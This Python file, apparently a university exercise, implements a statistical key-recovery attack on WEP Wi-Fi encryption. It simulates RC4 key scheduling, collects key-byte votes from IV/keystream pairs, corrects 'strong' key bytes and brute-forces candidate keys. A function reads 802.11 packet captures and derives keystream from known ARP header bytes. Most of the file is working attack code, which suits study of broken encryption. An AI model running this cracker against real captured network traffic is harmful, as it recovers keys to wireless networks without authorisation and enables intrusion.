from base64 import b64encode, b64decode
from collections import Counter
from itertools import product

from Aufgabe_2.Aufgabe_2_2.rc4.rc4 import fixed_rc4
from Aufgabe_2.Aufgabe_2_3.pcap_tools.pcap.pcap import PCAP
from Aufgabe_2.Aufgabe_2_3.pcap_tools.wep.wep import WEP
from Aufgabe_2.Aufgabe_2_3.pcap_tools.wlan.wlan import IEEE802_11
from Aufgabe_2.utils import log_timing, log
from Aufgabe_2.Aufgabe_2_2.wep.iv_and_cipher_generator import iv_and_stream_cipher_generator


def simulate_permutation(iv, n=256):
    """
    Approximate the permutation by simulating the first i steps
    of the key scheduling of RC4
    :param iv: Known part of the main key
    :return: s: S-box permuted to step 3, j: index j at step 3, s_invert: inverted s-box at step 3
    """
    # Initialize s-box
    s = []
    for i in range(n):
        s.append(i)
    s_invert = list(s)

    j = 0
    # Calculate permutation for bytes K[0] to K[2]
    for i in range(3):
        j = (j + s[i] + iv[i]) % n
        s[i], s[j] = s[j], s[i]

    # Invert s-box at step 3
    for r in range(len(s)):
        s_invert[s[r]] = r

    return s, j, s_invert


def calculate_key_byte_vote(i, key_stream, s_box_3, s_box_3_invert, j_3, n=256):
    """
    Approximate the key byte at position i
    :param key_stream: RC4 key stream
    :param s_box_3: S-box at step i-1
    :param i: iterator
    :param j: iterator at step i-1
    :return: key byte at position i
    """
    # Calculate key byte
    sum = s_box_3[3]
    for l in range(4, i + 4):
        sum = (sum + s_box_3[l]) % n
    key_byte = (s_box_3_invert[((3 + i) - key_stream[2 + i]) % n] - (j_3 + sum) % n) % n
    return key_byte


def vote_generator(iv, key_stream, key_length):
    s_box_3, j_3, s_box_3_invert = simulate_permutation(iv)
    key = []
    for i in range(key_length):
        key.append(calculate_key_byte_vote(i, key_stream, s_box_3, s_box_3_invert, j_3))
    return key


@log_timing()
def test_keys(key_set_iterator, tuple, n=256):
    iv = tuple[0]
    stream = tuple[1]
    for key_set in key_set_iterator:
        log("Got some keys: {}".format(key_set), level=1)
        for key in key_set:
            calculated_key_bytes = [key[0][0]]
            for i in range(1, len(key)):
                calculated_key_bytes.append((key[i][0] - key[i - 1][0]) % n)
            main_key = bytearray(calculated_key_bytes)
            calculated_stream = fixed_rc4(iv, main_key, cipher_length=len(stream))
            if calculated_stream == stream:
                log("Key found: {}".format(main_key), level=0)
                return main_key


def get_p_correct(i, n=256):
    q_i = get_q_i(i, n)
    return q_i * (1 - (1 / n)) ** (n - 2) * (2 / n) + (1 - q_i * (1 - (1 / n)) ** (n - 2)) * ((n - 2) / (n * (n - 1)))


def get_q_i(i, n):
    product = 1
    for k in range(1, i + 1):
        product *= (1 - (k / n))
    return (1 - (1 / n)) ** i * (1 - (i / n)) * product


def get_err_normal_at_pos(i, votes, n=256):
    p_correct = get_p_correct(i)
    p_wrong = (1 - p_correct) / (n - 1)
    arithmetic_sum = 0
    max_p = 0
    max_b = 0
    for l in range(n):
        fraction = get_fraction_of_votes(votes, l)
        if fraction > max_p:
            max_p = fraction
            max_b = l

    for j in range(n):
        if j == max_b:
            break
        arithmetic_sum += (get_fraction_of_votes(votes, j) - p_wrong) ** 2
    return (max_p - p_correct) ** 2 + arithmetic_sum


def get_err_strong_at_pos(votes, n=256):
    err_strong = 0
    p_equal = 1 / n
    for j in range(n):
        fraction = get_fraction_of_votes(votes, j)
        err_strong += (fraction - p_equal) ** 2
    return err_strong


def get_fraction_of_votes(votes, j):
    amount = sum(list(map(lambda x: x[0] == j, votes)))
    fraction = amount / len(votes)
    return fraction


def handle_strong_key_bytes(i, key, n=256):
    corrected_bytes = []
    arithmetic_sum = 0
    corrected_bytes.append((-3 - i - arithmetic_sum) % n)
    for l in range(i):
        result = 0
        for j in range(l, i):
            result += key[j] + 3 + j
        corrected_bytes.append((-3 - i - result) % n)
    return corrected_bytes


def check_strong_key_bytes(key):
    key_p = dict()
    for k, v in key.items():
        key_p.update({k: list(map(lambda x: (x, x / tuple_amount), v))})
    key_prob = []
    for k, b in key_p.items():
        err_strong = get_err_strong_at_pos(b)
        err_normal = get_err_normal_at_pos(k, b)
        key_prob.append(err_strong - err_normal)
    return key_prob


def contains_strong_key_byte(main_key, n=256):
    strong_bytes = []
    for l in range(len(main_key)):
        arithmetic_sum = main_key[l] + 3 + l
        for k in range(len(main_key), l):
            arithmetic_sum += main_key[k] + 3 + k
        strong_bytes.append(arithmetic_sum % n == 0)  # bytearray(b'\xa7\x83xS\xeb\xe4OJ\xfb1\x01\xb8\xf0')
    return strong_bytes


@log_timing()
def get_key_vote_dict(key_length_bytes):
    # Initialize dict
    key = dict()
    for i in range(key_length_bytes):
        key.update({i: []})
    for tuple in iv_stream_pair:
        single_vote = vote_generator(tuple[0], tuple[1], key_length_bytes)
        for index, key_s in enumerate(single_vote):
            key_votes = key.get(index)
            key_votes.append(key_s)
            key.update({index: key_votes})
    return key


def get_most_common_sorted(key_vote_dict, tuple_amount, candidate_amount):
    # Create dict of lists for key positions
    most_common = dict()
    for i in range(len(key_vote_dict)):
        most_common.update({i: []})
    for t, i in key_vote_dict.items():
        bytes_at_pos_t = Counter(i).most_common(candidate_amount)
        for j in bytes_at_pos_t:
            tmp = most_common.get(t)
            p = j[1] / tuple_amount
            tmp.append((j[0], p))
            most_common.update({t: tmp})

    return most_common


def combine_key_votes(key_vote_dict, tuple_amount, key_length, candidate_amount=3, threshold=0):
    """

    :param key_vote_dict:
    :param candidate_amount: Big values may cause high runtime
    :return:
    """
    # Take only the top most voted key bytes
    most_common, possible_key_set, corrected = get_most_voted_key(candidate_amount, key_vote_dict, tuple_amount, {})

    # Handle strong key bytes iteratively, this only works for threshold=0 if enough samples are available (>300000)
    while correct_key_bytes(key_vote_dict, possible_key_set, threshold, corrected):
        if key_length - 1 in corrected:
            break
    most_common, possible_key_set, corrected = get_most_voted_key(candidate_amount, key_vote_dict, tuple_amount,
                                                                  corrected)
    print('after loop')
    print(corrected)
    print(possible_key_set)
    print(most_common)
    # Key combination process
    while True:
        old_set = list()
        # Calculate possible key combinations
        cartesian_product_set_of_tuples = list(product(*possible_key_set))

        # Exclude already tested keys
        cartesian_product_set_of_tuples = set(cartesian_product_set_of_tuples) - set(old_set)
        # Return list of keys
        print(cartesian_product_set_of_tuples)
        yield cartesian_product_set_of_tuples

        old_set += cartesian_product_set_of_tuples
        # calculate byte with smallest distance in probability
        candidate_list = []
        for key, value in most_common.items():
            for index, v in enumerate(value):
                if v not in possible_key_set[key]:
                    # Calculate and add probability delta
                    max_p = possible_key_set[key][0][1]
                    p = max_p - v[1]
                    c = (v[0], v[1], p)
                    candidate_list.append(c)
                    break
                # If all candidates are used, append placeholder
                if index == len(value) - 1:
                    candidate_list.append((0, 0, 1))

        # Take byte with smallest probability distance to top voted at its key byte position
        candidate = sorted(candidate_list, key=lambda x: x[2])[0]
        # Break if all candidates are used in combination process
        if candidate[2] == 1:
            log("Out of candidates.", level=0)
            return None
        # Remove probability delta
        candidate_position = candidate_list.index(candidate)
        candidate_without_delta = (candidate[0], candidate[1])
        # Append key byte to set at position
        possible_key_set[candidate_position].append(candidate_without_delta)


def get_most_voted_key(candidate_amount, key_vote_dict, tuple_amount, bytes_to_correct):
    most_common = get_most_common_sorted(key_vote_dict, tuple_amount, candidate_amount)

    # Replace corrected key bytes at position
    for key, value in most_common.items():
        corrected_bytes_at_position = bytes_to_correct.get(key)
        if corrected_bytes_at_position:
            most_common.update({key: corrected_bytes_at_position})

    possible_key_set = []
    # Initialize with only the most common bytes
    for i in range(len(key_vote_dict)):
        key_byte_and_p = list(most_common.values())[i][0]
        possible_key_set.append([key_byte_and_p])

    return most_common, possible_key_set, bytes_to_correct


def correct_key_bytes(key_vote_dict, possible_key_set, threshold, corrected, n=256):
    # Check for strong key bytes and eventually correct them

    # TODO: refactor this to function
    calculated_key_bytes = [possible_key_set[0][0][0]]
    for i in range(1, len(possible_key_set)):
        calculated_key_bytes.append((possible_key_set[i][0][0] - possible_key_set[i - 1][0][0]) % 256)
    main_key = bytearray(calculated_key_bytes)

    err_delta_at_positions = check_strong_key_bytes(key_vote_dict)
    # (err_strong - err_normal) < threshold or err_strong < err_normal
    strong_byte_at_position = list(map(lambda x: x < threshold, err_delta_at_positions))
    if True in strong_byte_at_position:
        bytes_to_correct = []
        position_to_correct = 0
        for index, strong in enumerate(strong_byte_at_position):
            if index not in corrected and strong:
                bytes_to_correct = handle_strong_key_bytes(index, main_key)
                position_to_correct = index
                break
        tmp = corrected.get(position_to_correct)
        if not tmp:
            tmp = []
        for byte in bytes_to_correct:
            byte = (main_key[max(0, position_to_correct - 1)] + byte) % n
            tmp.append((byte, 1))
        corrected.update({position_to_correct: tmp})
        return True

    return False


def read_cap_file(file_path, tuple_amount=50000):
    mypcap = PCAP(file_path)
    pcaph = mypcap.header()

    print("===== Lese folgende Datei ein: \"{}\" =====".format(file_path))
    print("Verison: " + str(pcaph['major']) + "." + str(pcaph['minor']))
    print("Type: " + str(pcaph['captypestring']) + "(" + str(pcaph['captype']) + ") MaxLen: " + str(pcaph['maxlen']))
    print("Number of Packets: " + str(sum(1 for _ in mypcap)))

    known_headers = bytearray(
        [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])
    iv_stream_pair = []
    for packet in mypcap:
        if packet['len'] == 68:
            iv, k, ciphertext, icv = WEP(IEEE802_11(packet['data']).get_payload()).get()
            stream_key = bytearray([a ^ b for (a, b) in zip(ciphertext, known_headers)])
            iv_stream_pair.append((b64encode(iv), b64encode(stream_key)))
    return set(iv_stream_pair)


if __name__ == '__main__':
    key_length_bytes = 5
    tuple_amount = 500000
    # Info
    print("Using key length of {} bytes".format(key_length_bytes))
    print("Generating Keystream")
    # Retrieve sample set of bytearray tuples
    iv_stream_pair_str, main_key = iv_and_stream_cipher_generator(key_length=key_length_bytes,
                                                                  tuple_amount=tuple_amount, cache=True)
    # iv_stream_pair_str_1 = read_cap_file("../Aufgabe_2_3/wep-128_1min.cap", tuple_amount=tuple_amount)
    # iv_stream_pair_str_2 = read_cap_file("../Aufgabe_2_3/wep-128_2min.cap", tuple_amount=tuple_amount)
    # iv_stream_pair_str = iv_stream_pair_str_1.union(iv_stream_pair_str_2)
    # iv_stream_pair = list(map(lambda x: (b64decode(x[0]), b64decode(x[1])), iv_stream_pair_str))
    iv_stream_pair = list(map(lambda x: (b64decode(x[0]), b64decode(x[1])), iv_stream_pair_str))
    print("Start Hacking")
    print(main_key)
    tuple_amount = min(len(iv_stream_pair), tuple_amount)
    print("Using {} tuples".format(tuple_amount))

    key = get_key_vote_dict(key_length_bytes)

    key_set_iterator = combine_key_votes(key, tuple_amount, key_length_bytes)

    test_keys(key_set_iterator, (iv_stream_pair[0][0], iv_stream_pair[0][1]))
